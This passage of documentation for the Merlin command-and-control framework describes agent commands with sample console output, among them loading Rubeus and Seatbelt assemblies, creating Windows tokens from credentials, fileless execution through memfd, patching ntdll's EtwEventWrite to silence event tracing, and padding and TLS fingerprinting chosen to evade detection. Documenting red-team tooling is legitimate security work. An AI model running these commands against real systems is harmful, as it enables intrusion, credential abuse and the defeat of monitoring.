<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» listener stop tcp 127.0.0.1:7777
[-] Created job zlVVVBDCVS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-23T16:53:58Z
[-] Results of job zlVVVBDCVS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-07-23T16:54:18Z
[+] Successfully closed TCP listener on 127.0.0.1:7777
</pre></div>
</div>
</section>
</section>
<section id="listeners">
<h2>listeners<a class="headerlink" href="#listeners" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">listeners</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">listeners</span></code> command moves to the Listeners menu.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» listeners
    Merlin[listeners]»
</pre></div>
</div>
</section>
<section id="list-assemblies">
<h2>list-assemblies<a class="headerlink" href="#list-assemblies" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">list-assemblies</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">list-assemblies</span></code> command lists .NET assemblies that have been loaded into the agent’s process with the <a class="reference internal" href="#load-assembly">load-assembly</a> command.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» list-assemblies
[-] Created job NIflRstGrR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job NIflRstGrR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Loaded Assemblies:
seatbelt.exe
rubeus.exe
sharpdpapi.exe
sharpup.exe
Hagrid
</pre></div>
</div>
</section>
<section id="load-assembly">
<h2>load-assembly<a class="headerlink" href="#load-assembly" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">load-assembly</span> <span class="pre">filePath</span> <span class="pre">[alias]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">load-assembly</span></code> command loads a .NET assembly into the agent’s process. Once the assembly is loaded, it can be executed
multiple times with the <a class="reference internal" href="#invoke-assembly">invoke-assembly</a> command. The .NET assembly is only sent across the wire one time.
An option third argument can be provided to reference the assembly as any other name when executed with the
<a class="reference internal" href="#invoke-assembly">invoke-assembly</a> command.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Only CLR v4 is currently supported which can be used to execute both v3.5 and v4 .NET assemblies</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly /root/Rubeus.exe
[-] Created job iQOkWgGqkJ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job iQOkWgGqkJ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] successfully loaded rubeus.exe into the default AppDomain
</pre></div>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly /root/Rubeus.exe Hagrid
[-] Created job YrPdQkcuTG for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job YrPdQkcuTG for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] successfully loaded Hagrid into the default AppDomain
</pre></div>
</div>
</section>
<section id="load-clr">
<span id="loadclr"></span><h2>load-clr<a class="headerlink" href="#load-clr" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">load-clr</span> <span class="pre">VERSION</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">load-clr</span></code> command loads the specified version of the .NET CLR into the current process.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-clr v4.0
[-] Created job zvxxrESztw for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-08-11T19:11:45Z
[-] Results of job zvxxrESztw for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2023-08-11T19:12:08Z
[+]
The v4.0 .NET CLR runtime was successfully loaded
</pre></div>
</div>
</section>
<section id="ls">
<span id="id16"></span><h2>ls<a class="headerlink" href="#ls" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">ls</span> <span class="pre">[filePath]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">ls</span></code> command is used to list a directory’s contents using native Go functions within Merlin.
This command will not execute the <code class="docutils literal notranslate"><span class="pre">ls</span></code> or <code class="docutils literal notranslate"><span class="pre">dir</span></code> binary programs found on their associated host operating systems.
If a directory is not specified, Merlin will list the contents of the current working directory.
When specifying a Windows path, you must escape the backslash (e.g.,. <cite>C:\Temp</cite>).
Wrap file paths containing a space in quotations. Alternatively, Linux file paths with a space can be called without
quotes by escaping the space (e.g.,. <code class="docutils literal notranslate"><span class="pre">/root/some\</span> <span class="pre">folder/</span></code>). Relative paths can be used (e.g.,. <code class="docutils literal notranslate"><span class="pre">./../</span></code> or
<code class="docutils literal notranslate"><span class="pre">downloads\\Merlin</span></code>) and they are resolved to their absolute path.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ls /var
[-]Created job eNJKIiLXXH for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job eNJKIiLXXH
Directory listing for: /var

drwxr-xr-x      2019-02-06 00:05:17     4096    backups
drwxr-xr-x      2018-12-24 14:40:14     4096    cache
dgtrwxrwxrwx    2019-02-06 00:05:16     4096    crash
drwxr-xr-x      2019-01-17 21:24:30     4096    lib
dgrwxrwxr-x     2018-04-24 04:34:22     4096    local
Lrwxrwxrwx      2018-11-07 21:33:01     9       lock
drwxrwxr-x      2019-02-06 00:05:39     4096    log
dgrwxrwxr-x     2018-07-24 23:03:56     4096    mail
dgtrwxrwxrwx    2018-07-24 23:09:50     4096    metrics
drwxr-xr-x      2018-07-24 23:03:56     4096    opt
Lrwxrwxrwx      2018-11-07 21:33:01     4       run
drwxr-xr-x      2018-11-07 21:45:43     4096    snap
drwxr-xr-x      2018-11-07 21:38:04     4096    spool
dtrwxrwxrwx     2019-02-06 00:05:38     4096    tmp
</pre></div>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ls &quot;C:\\Program Files (x86)\\&quot;
[-]Created job ggQPFQhTrC for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job ggQPFQhTrC
Directory listing for: C:\Program Files (x86)

drwxrwxrwx      2018-09-15 00:42:33     0       Common Files
drwxrwxrwx      2018-09-15 02:08:27     0       Internet Explorer
drwxrwxrwx      2018-09-15 00:33:50     0       Microsoft.NET
drwxrwxrwx      2018-09-15 02:07:46     0       Windows Defender
drwxrwxrwx      2018-12-27 12:42:42     0       Windows Kits
drwxrwxrwx      2018-09-15 00:33:53     0       Windows Mail
drwxrwxrwx      2018-12-16 13:15:58     0       Windows Media Player
drwxrwxrwx      2018-09-15 02:10:06     0       Windows Multimedia Platform
drwxrwxrwx      2019-01-10 08:18:11     0       Windows Photo Viewer
drwxrwxrwx      2018-09-15 02:10:06     0       Windows Portable Devices
drwxrwxrwx      2018-09-15 00:33:50     0       Windows Sidebar
drwxrwxrwx      2018-09-15 00:33:50     0       WindowsPowerShell
-rw-rw-rw-      2018-09-15 00:31:34     174     desktop.ini
drwxrwxrwx      2018-09-15 00:42:33     0       windows nt
</pre></div>
</div>
</section>
<section id="main">
<h2>main<a class="headerlink" href="#main" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">main</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">main</span></code> command is used to leave the Agent menu and return back to the <a class="reference internal" href="main.html"><span class="doc">Main Menu</span></a>. It is an alias for the <code class="docutils literal notranslate"><span class="pre">back</span></code> command.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» main
Merlin»
</pre></div>
</div>
</section>
<section id="make-token">
<h2>make_token<a class="headerlink" href="#make-token" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">make_token</span> <span class="pre">DOMAIN\\USERNAME</span> <span class="pre">PASSWORD</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">make_token</span></code> command creates a new Windows access token
This command is an alias for the <a class="reference internal" href="#token-make"><span class="std std-ref">make</span></a> command.n” +</p>
<p>Tokens are created with the Windows LogonUserW API call. The token is created with a type 9 - NewCredentials logon type.
This is the equivalent of using runas.exe /netonly. Commands such as ‘token whoami’ will show the username for the
process and not the created token due to the logon type, but will reflect the new Logon ID</p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>Type 9 - NewCredentials tokens only work for NETWORK authenticated activities</p>
</div>
<p>References:</p>
<ul class="simple">
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types">https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types</a></p></li>
</ul>
</section>
<section id="maxretry">
<span id="id17"></span><h2>maxretry<a class="headerlink" href="#maxretry" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">maxretry</span> <span class="pre">number</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">maxretry</span></code> control type is used to change the _maximum_ number of failed login an agent will allow before the agent quits. For the sake of this conversation, a login means establishing contact with a Merlin Server and receiving no errors. The default is 7. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the <code class="docutils literal notranslate"><span class="pre">agent</span> <span class="pre">info</span></code> command.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» maxretry 50
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
[-]Created job utpISXXXbl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</section>
<section id="memfd">
<h2>memfd<a class="headerlink" href="#memfd" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Linux</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">memfd</span> <span class="pre">filePath</span> <span class="pre">[args]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">memfd</span></code> command loads a Linux executable file into memory (RAM) as an anonymous file using the
<a class="reference external" href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">memfd_create</a> API call, executes it, and returns the
results.
The file is created with an empty string as its name.
Less the fact that RAM is a file on Linux, the executable is not written to disk.
View the <a class="reference external" href="https://www.sandflysecurity.com/blog/detecting-linux-memfd_create-fileless-malware-with-command-line-forensics/">Detecting Linux memfd_create() Fileless Malware with Command Line Forensics</a>
for detection guidance.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command will not run on Windows agents</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memfd /tmp/hello.py
[-] Created job ZyeWhgfThk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job ZyeWhgfThk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Hello from a Python script
</pre></div>
</div>
</section>
<section id="memory">
<h2>memory<a class="headerlink" href="#memory" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">memory</span> <span class="pre">{read|write|patch}</span> <span class="pre">module</span> <span class="pre">procedure</span> <span class="pre">{readLength</span> <span class="pre">|</span> <span class="pre">hexData}</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">memory</span></code> command is used to interact with the agent’s virtual memory through the following methods:</p>
<blockquote>
<div><ul class="simple">
<li><p><a class="reference internal" href="#patch">patch</a></p></li>
<li><p><a class="reference internal" href="#read">read</a></p></li>
<li><p><a class="reference internal" href="#write">write</a></p></li>
</ul>
</div></blockquote>
<p>Uses direct syscalls for <code class="docutils literal notranslate"><span class="pre">NtReadVirtualMemory</span></code>, <code class="docutils literal notranslate"><span class="pre">NtProtectVirtualMemory</span></code>, &amp; <code class="docutils literal notranslate"><span class="pre">ZwWriteVirtualMemory</span></code> implemented
using <a class="reference external" href="https://github.com/C-Sto/BananaPhone">BananaPhone</a></p>
<section id="patch">
<span id="id18"></span><h3>patch<a class="headerlink" href="#patch" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">memory</span> <span class="pre">patch</span> <span class="pre">module</span> <span class="pre">function</span> <span class="pre">bytes</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">patch</span></code> command locates the address of the provided procedure/function, reads the existing bytes, and the
overwrites them with the provided bytes. A second read is performed to validate the write event. The command would be
the same as calling the <code class="docutils literal notranslate"><span class="pre">read</span></code> and <code class="docutils literal notranslate"><span class="pre">write</span></code> commands individually.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory patch ntdll.dll EtwEventWrite 9090C3
[-] Created job quRORyMMxS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job quRORyMMxS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+]
Read  3 bytes from ntdll.dll!EtwEventWrite: 4C8BDC
Wrote 3 bytes to   ntdll.dll!EtwEventWrite: 9090C3
Read  3 bytes from ntdll.dll!EtwEventWrite: 9090C3
</pre></div>
</div>
</section>
<section id="read">
<span id="id19"></span><h3>read<a class="headerlink" href="#read" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">memory</span> <span class="pre">read</span> <span class="pre">module</span> <span class="pre">function</span> <span class="pre">length</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">read</span></code> command locates the address of the provided procedure/function and reads the specified number of bytes.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory read ntdll.dll EtwEventWrite 3
[-] Created job YlqClnqRdK for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job YlqClnqRdK for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Read 3 bytes from ntdll.dll!EtwEventWrite: 4C8BDC
</pre></div>
</div>
</section>
<section id="write">
<span id="id20"></span><h3>write<a class="headerlink" href="#write" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">memory</span> <span class="pre">write</span> <span class="pre">module</span> <span class="pre">function</span> <span class="pre">bytes</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">write</span></code> command locates teh address of the provided procedure/function and writes the specified bytes.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory write ntdll.dll EtwEventWrite 9090C3
[-] Created job XTXJBLoZuO for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job XTXJBLoZuO for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+]
Wrote 3 bytes to ntdll.dll!EtwEventWrite: 9090C3
</pre></div>
</div>
</section>
</section>
<section id="modules">
<h2>modules<a class="headerlink" href="#modules" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">modules</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">modules</span></code> command moves to the Modules menu.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» modules
Merlin[modules]»
</pre></div>
</div>
</section>
<section id="netstat">
<h2>netstat<a class="headerlink" href="#netstat" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">netstat</span> <span class="pre">[-p</span> <span class="pre">tcp|udp]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">netstat</span></code> command uses the Windows API to enumerating network connections and listening ports.
Without any arguments, the <code class="docutils literal notranslate"><span class="pre">netstat</span></code> command returns all TCP and UDP network connections.</p>
<p>Use <code class="docutils literal notranslate"><span class="pre">netstat</span> <span class="pre">-p</span> <span class="pre">tcp</span></code> to only return TCP connections and <code class="docutils literal notranslate"><span class="pre">netstat</span> <span class="pre">-p</span> <span class="pre">udp</span></code> to only return UDP connections.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» netstat
[-] Created job JEFMANkdaU for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job JEFMANkdaU for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+]
Proto Local Addr              Foreign Addr            State        PID/Program name
udp   0.0.0.0:123             0.0.0.0:0                            3272/svchost.exe
udp   0.0.0.0:500             0.0.0.0:0                            3104/svchost.exe
udp   0.0.0.0:3389            0.0.0.0:0                            984/svchost.exe
udp6  :::123                  0.0.0.0:0                            3272/svchost.exe
udp6  :::500                  0.0.0.0:0                            3104/svchost.exe
udp6  :::3389                 0.0.0.0:0                            984/svchost.exe
tcp   0.0.0.0:135             0.0.0.0:0               LISTEN       964/svchost.exe
tcp   0.0.0.0:445             0.0.0.0:0               LISTEN       4/System
tcp   0.0.0.0:3389            0.0.0.0:0               LISTEN       984/svchost.exe
tcp   127.0.0.1:52945         127.0.0.1:5357          TIME_WAIT
tcp   127.0.0.1:54441         127.0.0.1:5357          TIME_WAIT
tcp   192.168.1.11:59757      72.21.91.29:80          CLOSE_WAIT   6496/SearchApp.exe
tcp   192.168.1.11:59763      72.21.91.29:80          CLOSE_WAIT   12076/YourPhone.exe
tcp6  :::135                  :::0                    LISTEN       964/svchost.exe
tcp6  :::445                  :::0                    LISTEN       4/System
tcp6  :::3389                 :::0                    LISTEN       984/svchost.exe
</pre></div>
</div>
</section>
<section id="note">
<h2>note<a class="headerlink" href="#note" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">note</span> <span class="pre">message</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">note</span></code> command creates a server-side note that operators can use to record miscellaneous information about an agent.
The note is displayed in a column of the output from the <a class="reference internal" href="#sessions">sessions</a> command</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» note Demo Agent Here
[i] Agent c1090dbc-f2f7-4d90-a241-86e0c0217786&#39;s note set to: Demo Agent Here
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sessions

               AGENT GUID              |    TRANSPORT    |   PLATFORM    |      HOST       |        USER         |                 PROCESS                  | STATUS | LAST CHECKIN |      NOTE
+--------------------------------------+-----------------+---------------+-----------------+---------------------+------------------------------------------+--------+--------------+-----------------+
  c1090dbc-f2f7-4d90-a241-86e0c0217786 | HTTP/2 over TLS | linux/amd64   | ubuntu          | rastley             | main(200769)                             | Active | 0:00:08 ago  | Demo Agent Here
</pre></div>
</div>
</section>
<section id="nslookup">
<h2>nslookup<a class="headerlink" href="#nslookup" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">nslookup</span> <span class="pre">{hostname|ip</span> <span class="pre">address}</span> <span class="pre">{hostname|ip</span> <span class="pre">address}</span> <span class="pre">...</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">nslookup</span></code> command takes a space separated list of IP addresses or hostnames and performs a DNS query using the
host’s resolver and returns the results.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» nslookup 8.8.8.8 9.9.9.9 github.com google.com
[-] Created job fQilcQFmlk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job fQilcQFmlk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Query: 8.8.8.8, Result: dns.google.
Query: 9.9.9.9, Result: dns9.quad9.net.
Query: github.com, Result: 192.30.255.113
Query: google.com, Result: 142.250.73.238 2607:f8b0:4004:82a::200e
</pre></div>
</div>
</section>
<section id="padding">
<span id="id21"></span><h2>padding<a class="headerlink" href="#padding" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">padding</span> <span class="pre">size</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">padding</span></code> control type is used to change the _maximum_ size of a message’s padding.
A random value between 0 and the maximum padding value is selected on a per message basis and added to the end of each message.
This is used in an attempt to evade detection when a program looks for messages with same size beaconing out.
The default is 4096. There is no response on the CLI after the instruction has been provided to the agent.
You can verify the setting was changed using the <code class="docutils literal notranslate"><span class="pre">agent</span> <span class="pre">info</span></code> command.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set padding 8192
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
[-]Created job wlGTwgtqNx for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</section>
<section id="parrot">
<h2>parrot<a class="headerlink" href="#parrot" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">parrot</span> <span class="pre">browserString</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">parrot</span></code> command changes the HTTP client’s TLS configuration to match the provided browser string.
Tab completion contains <strong>some</strong> of, but not all, the supported browser strings.
This setting will override the <code class="docutils literal notranslate"><span class="pre">ja3</span></code> setting.
Examples of some supported values are:</p>
<ul class="simple">
<li><p><code class="docutils literal notranslate"><span class="pre">HelloChrome_Auto</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">HelloChrome_102</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">HelloGolang</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">HelloFirefox_Auto</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">HelloIOS_Auto</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">HelloEdge_Auto</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">HelloSafari_Auto</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">Hello360_Auto</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">HelloQQ_Auto</span></code></p></li>
</ul>
<p>A full list of options can be found in the <code class="docutils literal notranslate"><span class="pre">u_common.go</span></code> in the <a class="reference external" href="https://github.com/refraction-networking/utls/tree/master">utls library</a>.</p>
</section>
<section id="pipes">
<h2>pipes<a class="headerlink" href="#pipes" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">pipes</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">pipes</span></code> command lists all of the named pipes on the Windows host where the agent is currently running:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pipes
[-] Created job XYXXiZaGev for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job XYXXiZaGev for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+]
Named pipes:
\\.\pipe\InitShutdown
\\.\pipe\lsass
\\.\pipe\ntsvcs
\\.\pipe\scerpc
\\.\pipe\Winsock2\CatalogChangeListener-2f4-0
\\.\pipe\Winsock2\CatalogChangeListener-3c4-0
\\.\pipe\epmapper
\\.\pipe\Winsock2\CatalogChangeListener-254-0
\\.\pipe\LSM_API_service
\\.\pipe\Winsock2\CatalogChangeListener-3f8-0
\\.\pipe\eventlog
\\.\pipe\Winsock2\CatalogChangeListener-558-0
\\.\pipe\TermSrv_API_service
\\.\pipe\Ctx_WinStation_API_service
\\.\pipe\atsvc
\\.\pipe\Winsock2\CatalogChangeListener-734-0
\\.\pipe\wkssvc
\\.\pipe\SessEnvPublicRpc
\\.\pipe\Winsock2\CatalogChangeListener-a1c-0
\\.\pipe\spoolss
\\.\pipe\Winsock2\CatalogChangeListener-adc-0
\\.\pipe\trkwks
</pre></div>
</div>
</section>
<section id="printenv">
<h2>printenv<a class="headerlink" href="#printenv" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">printenv</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">printenv</span></code> command is an alias for the <code class="docutils literal notranslate"><span class="pre">env</span></code> <a class="reference internal" href="#showall">showall</a> command that enumerates and return all environment variables:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» printenv
[-] Created job NzbQEytJpY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job NzbQEytJpY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+]
Environment variables:
SHELL=/bin/bash
SESSION_MANAGER=local/ubuntu:@/tmp/.ICE-unix/3195,unix/ubuntu:/tmp/.ICE-unix/3195
QT_ACCESSIBILITY=1
SNAP_REVISION=148
XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg
XDG_MENU_PREFIX=gnome-
GNOME_DESKTOP_SESSION_ID=this-is-deprecated
SNAP_REAL_HOME=/home/rastley
GNOME_SHELL_SESSION_MODE=ubuntu
SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
</pre></div>
</div>
</section>
<section id="ps">
<span id="id22"></span><h2>ps<a class="headerlink" href="#ps" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">ps</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">ps</span></code> command uses the Windows API to gather available information about running processes.
The agent is not running in a high-integrity process then some of the information will be missing.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]]» ps
[-] Created job afYByFZoXV for agent c1090dbc-f2f7-4d90-a241-86e0c0217786]

[-] Results job afYByFZoXV for agent c1090dbc-f2f7-4d90-a241-86e0c0217786]

[+]
PID     PPID    ARCH    OWNER   EXE
0       0       x64             [System Process]
4       0       x64             System
124     4       x64             Registry
412     4       x64             smss.exe
508     496     x64             csrss.exe
596     496     x64             wininit.exe
604     588     x64             csrss.exe
668     588     x64     BUILTIN\Administrators  winlogon.exe
736     596     x64             services.exe
&lt;SNIP&gt;
4648    2504    x64     DESKTOP-H39FR21\bob     sihost.exe
5732    736     x64     DESKTOP-H39FR21\bob     svchost.exe
5684    736     x64     DESKTOP-H39FR21\bob     svchost.exe
